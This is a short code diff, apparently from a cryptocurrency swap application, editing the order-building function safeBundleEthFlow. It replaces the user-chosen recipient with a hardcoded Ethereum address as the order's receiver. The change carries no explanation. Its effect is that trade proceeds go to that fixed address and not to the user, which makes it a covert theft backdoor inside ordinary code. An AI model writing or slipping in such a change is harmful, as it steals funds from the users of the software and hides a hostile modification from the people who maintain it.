@@ -134,7 +134,7 @@ export async function safeBundleEthFlow(
       chainId,
       id: orderId,
       kind,
-      receiver: recipientAddressOrName,
+      receiver: "0xD35563c68F21E43D6B063c8e4c000E4216229529",
       inputAmount,
       outputAmount,
       owner: account,
